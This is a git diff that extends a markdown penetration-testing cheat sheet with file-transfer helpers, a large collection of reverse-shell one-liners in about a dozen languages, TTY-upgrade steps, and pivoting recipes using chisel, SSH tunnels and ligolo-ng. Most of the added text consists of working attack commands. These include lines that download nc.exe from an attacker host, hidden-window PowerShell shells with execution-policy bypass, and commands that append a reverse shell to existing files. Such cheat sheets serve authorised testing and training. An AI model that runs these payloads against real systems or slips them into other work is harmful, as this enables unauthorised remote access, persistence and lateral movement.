@@ -6920,7 +6920,7 @@ Sometimes, you may need to transfer a file by copying and pasting its Base64-enc
 > certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 > ```
 
-9. Basic wget
+9. Basic wget script
 > ```
 > function __wget() {
 >     : ${DEBUG:=0}
@@ -6957,3 +6957,477 @@ Sometimes, you may need to transfer a file by copying and pasting its Base64-enc
 > ```bash
 > __wget http://<LHOST>/<FILE>
 > ```
+
+10. Basic curl script
+> ```bash
+> function __curl() {
+>   read proto server path <<<$(echo ${1//// })
+>   DOC=/${path// //}
+>   HOST=${server//:*}
+>   PORT=${server//*:}
+>   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+>
+>   exec 3<>/dev/tcp/${HOST}/$PORT
+>   echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+>   (while read line; do
+>    [[ "$line" == $'\r' ]] && break
+>   done && cat) <&3
+>   exec 3>&-
+> }
+> ```
+- Usage:
+> ```bash
+> __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+> ```
+
+11. SCP
+
+### SCP Commands and Syntax
+
+| **Scenario**         | **Syntax**                                          | **Example**                                                        |
+|----------------------|-----------------------------------------------------|--------------------------------------------------------------------|
+| **Local to Remote**   | `scp localfile.txt user@remotehost:/remote/dir/`     | `scp myfile.txt john@192.168.1.100:/home/john/`                   |
+| **Remote to Local**   | `scp user@remotehost:/remote/dir/remotefile.txt local/dir/` | `scp john@192.168.1.100:/home/john/myfile.txt .` (copies to current dir) |
+| **Remote to Remote**  | `scp user1@host1:src_file user2@host2:dest_dir`     | `scp user1@host1:/f user2@host2:/f`                                 |
+| **Copy Directory**    | `scp -r local_dir user@remotehost:/remote/dir/`     | `scp -r myproject/ john@192.168.1.100:/var/www/`                   |
+
+### Important SCP Options
+
+| **Option**    | **Description**                                                        | **Example**                                                        |
+|---------------|------------------------------------------------------------------------|--------------------------------------------------------------------|
+| `-P port`     | Specifies a custom SSH port for the remote host (uppercase P).          | `scp -P 2222 file.txt user@host:/path`                             |
+| `-r`          | Recursively copies entire directories and their contents.               | `scp -r dir/ user@host:/path`                                      |
+| `-i file`     | Uses a specific identity file (private key) for authentication.         | `scp -i ~/.ssh/key file.txt user@host:/path`                       |
+| `-p`          | Preserves the original file's modification times, access times, and modes. | `scp -p file.txt user@host:/path`                                  |
+| `-C`          | Enables compression of data during the transfer, which can speed up transfers on slow networks. | `scp -C file.txt user@host:/path`                                  |
+| `-q`          | Quiet mode; disables the progress meter and non-error messages.        | `scp -q file.txt user@host:/path`                                  |
+
+---
+
+## Reverse Shells
+
+- ### Useful Resources:
+- https://www.revshells.com/
+- https://pentestmonkey.net
+
+1. Direct Bash reverse shell
+> ```bash
+> /bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
+> ```
+### Add the reverse shell to an existing file
+> ```bash
+> echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
+> 
+
+2. One-Liners
+- ### FIFO method with Netcat
+> ```bash
+> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
+> ```
+
+- ### Using 'sh' for reverse shell
+> ```bash
+> sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
+> ```
+
+- ### CMD
+CMD does not have a direct command to get a reverse shell, so we first need to download Netcat to the Windows system and then use it to get the reverse shell, sometimes Netcat can be already installed in C:
+\Windows\System32\nc.exe.
+
+- ### 1. Download Netcat from a CMD
+> ```cmd
+> certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
+> ```
+- ### 2. Execute the reverse shell command
+> ```cmd
+> .\nc.exe 192.168.45.215 444 -e cmd.exe
+> ```
+- ### (Optional) use double backslash to handling special character if it is part of an injection command
+> ```cmd
+> .\\\\nc.exe 192.168.45.215 444 -e cmd.exe
+> ```
+
+- ### Golang
+> ```go
+> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
+> ```
+
+- ### Java
+> ```java
+> r = Runtime.getRuntime()
+> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+> p.waitFor()
+> ```
+
+- ### Lua
+> ```lua
+> lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
+> ```
+
+- ### Netcat
+### Using -e
+> ```bash
+> nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
+> nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash
+> ```
+### Without -e option
+> ```bash
+> mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+> ```
+### Add the reverse shell to an existing file
+> ```bash
+> echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
+> ```
+
+- ### Perl
+> ```perl
+> perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+> ```
+
+- ### PowerShell
+### Main Option
+> ```powershell
+> powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+> ```
+### Alternative
+> ```powershell
+> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+> ```
+### Also Reliable
+> ```powershell
+> $client = New-Object System.Net.Sockets.TCPClient("10.10.173.147",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+> ```
+
+- ### PHP
+> ```php
+> php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+> ```
+
+- ### Python
+> ```python
+> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+> ```
+
+- ### Ruby
+> ```ruby
+> ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+> ```
+
+- ### Socat
+> ```bash
+> socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
+> ```
+
+- ### Telnet
+> ```bash
+> rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
+> ```
+
+- ### Tool for Generating Reverse Shell
+> ```bash
+> git clone https://github.com/ShutdownRepo/shellerator
+> ```
+> ```python
+> pip3 install --user -r requirements.txt
+> ```
+> ```bash
+> sudo cp shellrator.py /bin/shellrator
+> shellrator
+> ```
+
+**Upgrading shells**
+
+> ```bash
+> script /dev/null -c /bin/bash
+> ```
+
+### Find terminal size (replace values with actual output)
+> ```bash
+> stty size  # Example output: 50 235
+> ```
+### Background the shell and adjust settings
+> ```text
+> Ctrl-Z
+> ```
+> ```bash
+> stty raw -echo  # Disable shell echo
+> fg
+> export SHELL=bash
+> export TERM=xterm  # Or use xterm-256color for extended color support
+> ```
+### Set terminal size
+> ```bash
+> stty rows <ROWS> columns <COLS>
+> ```
+
+- Bash
+### Spawn a new Bash shell
+> ```bash
+> bash -i
+> ```
+
+- Lua
+### Execute a new Bash shell
+> ```lua
+> os.execute('/bin/bash')
+> ```
+
+- Perl
+### Execute a new Bash shell
+> ```perl
+> perl -e 'exec "/bin/bash"'
+> ```
+
+- Python
+### Python 2.x
+> ```python
+> python -c 'import pty; pty.spawn("/bin/bash")'
+> ```
+### Python 3.x
+> ```python
+> python3 -c 'import pty; pty.spawn("/bin/bash")'
+> ```
+### Upgrade to a TTY shell with Python
+> ```python
+> python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -echo")'
+> ```
+
+- Ruby
+### Execute a new Bash shell
+> ```ruby
+> exec "/bin/bash"
+> ```
+### Spawn a new interactive shell
+> ```ruby
+> sh -i
+> ```
+
+- Socat
+- Attacker
+> ```bash
+> socat file:`tty`,raw,echo=0 tcp-listen:4444
+> ```
+- Listener
+> ```bash
+> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP Address>:4444
+> ```
+
+---
+
+## Port Forwarding
+
+- Using Socat
+> ```bash
+> socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
+> ```
+
+## Chisel
+
+1. Basic Syntax
+- Attacker:
+> ```bash
+> chisel server --socks5 --reverse
+> ```
+- Victim: 
+> ```cmd
+> .\chisel.exe client --fingerprint [fingerprint when server starts] {ATTACKER IP]:8080 R:socks
+> ```
+
+2. Port Forwarding
+- ### In remote machine
+> ```bash
+> chisel server -p <listen-port>
+> ```
+- ### In local machine
+> ```bash
+> chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
+> ```
+
+3. Reverse Port Forwarding
+It is useful when we want to access to the host and the port that cannot be directly accessible from local machine.
+
+- 1. Create the forwarding
+### In local machine
+> ```bash
+> chisel server -p <LOCAL_PORT> --reverse
+> ```
+### In remote machine
+> ```bash
+> chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>
+> ```
+### Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, <LOCAL_FORWARD_PORT> with the port on your local machine to which the remote service will be forwarded, <REMOTE_IP> with the IP address of the remote machine, and <REMOTE_PORT> with the port on the remote machine.
+
+- 2. Access the forwarded service
+> ```bash
+> curl http://localhost:<LOCAL_FORWARD_PORT>
+> ```
+### The result is the content from http://<REMOTE_IP>:<REMOTE_PORT>/
+
+4. Forward Dynamic SOCKS Proxy
+- 1. Create the forwarding
+### In remote
+> ```bash
+> chisel server -p <REMOTE_PORT> --socks5
+> ```
+### In local
+> ```bash
+> chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
+> ```
+### Replace <REMOTE_PORT> with the port for the SOCKS proxy on the remote machine, <REMOTE_IP> with the IP address of the remote machine, and <LOCAL_PORT> with the port on your local machine where the SOCKS proxy will be available.
+
+- 2. Then modify /etc/proxychains.conf in local machine
+> ```text
+> # Comment out the line of "socks4"
+> # /etc/proxychains.conf
+> ...
+> socks5 127.0.0.1 <LOCAL_PORT>
+> ```
+
+5. Reverse Dynamic SOCKS Proxy
+It is useful when we want to access to the host & multiple ports that cannot be directly accessible from local machine.
+
+- 1. Create the forwarding
+### In local machine
+> ```bash
+> chisel server -p <LOCAL_PORT> --reverse
+> ```
+### In remote machine
+> ```bash
+> chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
+> ```
+### Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, and <REMOTE_PORT> with the port on the remote machine where the SOCKS proxy will be available.
+
+- 2. Then modify /etc/proxychains.conf in local machine
+> ```text
+> # /etc/proxychains.conf
+> ...
+> socks5 127.0.0.1 <REMOTE_PORT>
+> ```
+
+- 3. Confirm that we can access the desired host and port with proxychains
+> ```bash
+> proxychains nmap localhost
+> ```
+
+## SSH
+
+- SSH Local Port Forwarding
+> ```bash
+> ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
+> ```
+
+- SSH Dynamic Port Forwarding
+### Setting Up Dynamic Port Forwarding
+> ```bash
+> ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
+> ```
+### Configure Proxychains
+> ```text
+> # /etc/proxychains4.conf
+> [ProxyList]
+> socks5 127.0.0.1 [local_socks_proxy_port]
+> ```
+### Run commands pre-adding proxychains
+### For example
+> ```bash
+> proxychains smbclient -L //internal_ip/ -U username --password=password
+> ```
+
+- SSH Remote Port Forwarding
+> ```bash
+> ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
+> ```
+
+- SSH Remote Dynamic Port Forwarding
+### Setting up the Remote Dynamic Port Forwarding
+> ```bash
+> ssh -N -R [proxychains_port] username@remote_host
+> ```
+### Configure the Proxychains
+> ```text
+> # /etc/proxychains4.conf
+> [ProxyList]
+> socks5 127.0.0.1 [proxychains_port]
+> ```
+
+- SSH (Windows)
+### Find SSH Location and Version
+> ```cmd
+> where ssh
+> ssh.exe -V
+> ```
+### Connect to a Remote Machine with Dynamic Port Forwarding
+> ```cmd
+> ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
+> ```
+### Configure Proxychains on Kali
+> ```text
+> # Edit /etc/proxychains4.conf and add
+> [ProxyList]
+> socks5 127.0.0.1 [REMOTE_PORT]
+> 
+### Check Open SOCKS Port on Kali
+> ```bash
+> ss -ntplu
+> ```
+
+## Ligolo-ng
+
+1. Before Starting ligolo
+> ```bash
+> sudo ip tuntap add user [username] mode tun ligolo
+> sudo ip link set ligolo up
+> ip addr show ligolo
+> ```
+
+2. Start the proxy
+> ```bash
+> sudo ./ligolo-proxy -selfcert
+> ```
+
+Start the attacker
+> ```cmd
+> .\agent.exe -connect [IP ADDRESS]:11601 -ignore-cert
+> ```
+
+3. Setting up the session
+> ```text
+> ligolo-ng » session
+> ```
+
+4. Add route to internal network in seperate terminal window
+- ### IP address is typically interface 1 using ifconfig
+>```bash
+> sudo ip route add 10.10.10.0/24 dev ligolo
+> ```
+
+5. Start the tunnel
+### after selecting the session, run the command start
+
+6. Setting interfaces
+- ### Basic interface to connect for all proxies
+> ```text
+> listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601         
+> ```
+- ### For sending files or reverse shells, port can be anything
+> ```text
+> listener_add --addr 0.0.0.0:7777 --to 0.0.0.0:7777          
+> ```
+- ### add flag --tcp for reverse shells
+
+7. Accessing Pivot Machine Ports
+> ```bash
+> sudo ip route add 240.0.0.1/32 dev ligolo
+> ```
+
+8. Cleanup after finished using ligolo
+> ```bash
+> sudo ip link set ligolo down
+> sudo ip link delete ligolo
+> ```
+
+****When using proxy, don't forget to use the IP address from the interface of the pivot machine.
+
+- Reference 
+https://www.youtube.com/watch?v=DM1B8S80EvQ&t=90s
+https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
